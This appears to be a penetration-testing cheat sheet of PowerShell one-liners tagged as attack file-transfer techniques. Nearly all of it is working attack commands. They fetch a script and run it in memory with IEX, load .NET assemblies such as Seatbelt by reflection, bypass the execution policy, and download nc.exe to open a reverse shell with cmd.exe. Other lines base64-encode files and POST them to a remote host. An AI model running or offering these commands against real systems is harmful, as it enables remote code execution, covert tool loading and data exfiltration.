# powershell

% powershell, download

## Download with powershell
#plateform/windows #target/remote #cat/ATTACK/FILE_TRANSFERT 
```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "(New-Object System.Net.WebClient).DownloadFile('http://<server>/<source_file>','<dest_file>')"
```

## Download and execute with powershell
#plateform/windows #target/remote #cat/ATTACK/FILE_TRANSFERT #cat/ATTACK/EXPLOIT 
```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile New-Object System.Net.WebClient.DownloadFile('<url_file>','nc.exe'); nc.exe <ip> <port> -e cmd.exe
```

## Download powershell into memory
```powershell
(new-object system.net.webclient).downloadstring('http://<ip>/<script>') | IEX
```


## Download csharp into memory - Assembly reflection (gziped)
#cat/UTILS
```powershell
$compressed = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|80>/<asm_ref_bin_path><asm_ref_exe_name>.exe');$a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($compressed));$decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress);$asm = [System.Reflection.Assembly]::Load($decompressed); 
```

## Download csharp into memory - Assembly reflection 
#cat/UTILS
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|80>/<asm_ref_bin_path><asm_ref_exe_name>.exe'); $asm = [System.Reflection.Assembly]::Load($data); 
```
= asm_ref_bin_path: windows/NetFramework_4.7_x64/
= asm_ref_exe_name: Seatbelt


## run csharp from memory - Assembly reflection 
#cat/UTILS
```powershell
$params="<asm_ref_params>".split(" ");$OldConsoleOut = [Console]::Out; $StringWriter = New-Object IO.StringWriter ; [Console]::SetOut($StringWriter) ; $asm.EntryPoint.Invoke($null, [Object[]] @(@(,($params))));[Console]::SetOut($OldConsoleOut); $Results = $StringWriter.ToString(); $Results
```
= asm_ref_params: -group=user -full

## Upload with powershell (in-memory)
#plateform/windows #target/remote #cat/ATTACK/FILE_TRANSFERT #cat/ATTACK/EXPLOIT 
catch with nc then echo <base64> | base64 -d -w 0 > hosts
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<file>' -Encoding Byte));Invoke-RestMethod -Uri http://<local_ip>:<port|80>/ -Method POST -Body $b64
```

## Upload with powershell (file creation)
#plateform/windows #target/remote #cat/ATTACK/FILE_TRANSFERT #cat/ATTACK/EXPLOIT 
catch with nc then echo <base64> | base64 -d -w 0 > hosts
```powershell
certutil -encode <infile> <outfile>; $base64str = Get-Content <outfile> && Invoke-RestMethod -Uri http://<local_ip>:<port|80>/ -Method POST -Body $base64str
```